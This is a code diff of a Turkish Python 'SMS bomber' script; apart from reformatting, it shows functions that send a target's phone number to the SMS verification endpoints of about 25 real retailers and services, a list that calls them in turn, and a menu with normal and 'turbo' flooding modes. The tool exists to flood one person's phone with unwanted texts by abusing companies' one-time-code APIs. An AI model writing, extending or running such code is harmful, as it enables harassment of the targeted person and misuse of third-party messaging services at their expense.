@@ -432,8 +432,6 @@ def Bim(numara):
         print(Fore.RED + "[-] " + numara + " ------>"" Bim Başarısız!")
 
 
-
-
 def komagene(numara, token=None):
     url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
     payload = {
@@ -452,9 +450,9 @@ def komagene(numara, token=None):
 
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Komagene Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Komagene Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Komagene Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Komagene Başarısız!")
 
 
 def ozdilekteyim(numara):
@@ -472,9 +470,9 @@ def ozdilekteyim(numara):
     }
     response = requests.post(base_url, params=params, headers=headers)
     if response.status_code == [200, 201]:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Özdilekteyim Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Özdilekteyim Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Özdilekteyim Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Özdilekteyim Başarısız!")
 
 
 def ikinciyeni(numara):
@@ -493,9 +491,9 @@ def ikinciyeni(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" İkinciyeni Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" İkinciyeni Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" İkinciyeni Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" İkinciyeni Başarısız!")
 
 
 def totalenergies(numara):
@@ -532,9 +530,9 @@ def totalenergies(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Totalenergies Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Totalenergies Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Totalenergies Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Totalenergies Başarısız!")
 
 
 def pinarsu(numara):
@@ -548,9 +546,9 @@ def pinarsu(numara):
     }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Pinarsu Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Pinarsu Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Pinarsu Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" Pinarsu Başarısız!")
 
 
 def filemarket(numara):
@@ -564,9 +562,9 @@ def filemarket(numara):
                }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 202:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Filemarket Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Filemarket Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Filemarket Başarısız! ")
+        print(Fore.RED + "[-] " + numara + " ------>"" Filemarket Başarısız! ")
 
 
 def digital(numara):
@@ -584,9 +582,9 @@ def digital(numara):
                }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == [200, 202]:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" 345Digital Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" 345Digital Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" 345Digital Başarısız!")
+        print(Fore.RED + "[-] " + numara + " ------>"" 345Digital Başarısız!")
 
 
 def money(numara):
@@ -604,25 +602,26 @@ def money(numara):
                }
     response = requests.post(url, json=payload, headers=headers)
     if response.status_code == 200:
-        print(Fore.GREEN + "[+] "+numara+" ------>"" Money Başarılı!")
+        print(Fore.GREEN + "[+] " + numara + " ------>"" Money Başarılı!")
     else:
-        print(Fore.RED + "[-] "+numara+" ------>"" Money Başarısız!")
-           
+        print(Fore.RED + "[-] " + numara + " ------>"" Money Başarısız!")
+
+
 main = [money,
         digital,
         filemarket,
         pinarsu,
-        totalenergies, 
+        totalenergies,
         ikinciyeni,
         ozdilekteyim,
         komagene,
         totalenergies,
         Bim,
         houseofsuperstep,
-        mudo, 
+        mudo,
         sportive,
-        damattween, 
-        occasion, 
+        damattween,
+        occasion,
         evidia,
         kahvedunyasi,
         dominosgiris,
@@ -631,15 +630,15 @@ main = [money,
         koton,
         tıklagelsin,
         englishhome,
-        naos, 
+        naos,
         sok]
 
 os.system("cls" if os.name == "nt" else "clear")
 for line in flx:
     print(Fore.RED + line)
 
-print("Developer By : FLX       İG : @x__flx__        Sms Bomber\n")
-print(Fore.MAGENTA + "25 SMS SERVİS\n")
+print("Developer By : FLX                   İG : @x__flx__                     Sms Boomber\n")
+print(Fore.MAGENTA + "25 SMS SERVİSİ\n")
 
 print(Fore.YELLOW + "1 - Normal Sms")
 print(Fore.YELLOW + "2 - Turbo Sms")
